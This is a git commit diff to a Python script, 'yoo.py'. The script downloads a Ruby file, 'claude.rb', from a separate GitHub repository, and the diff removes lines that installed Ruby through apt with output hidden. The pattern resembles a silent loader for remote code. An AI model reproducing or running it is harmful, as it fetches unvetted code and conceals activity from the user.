d2e52ceb2d88af9da2ffdac4fe31412f70cf104a
lianamahesra-creator <lianamahesra@gmail.com>
2026-07-17 03:19:01 +0700

    Update yoo.py

--- yoo.py
+++ yoo.py
@@ -5,9 +5,7 @@ import os
 url = "https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/claude.rb"
 filename = "claude.rb"
 
-# Install ruby silently
-subprocess.run(["apt", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-subprocess.run(["apt", "install", "ruby", "-y"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 # Download the file
 urllib.request.urlretrieve(url, filename)
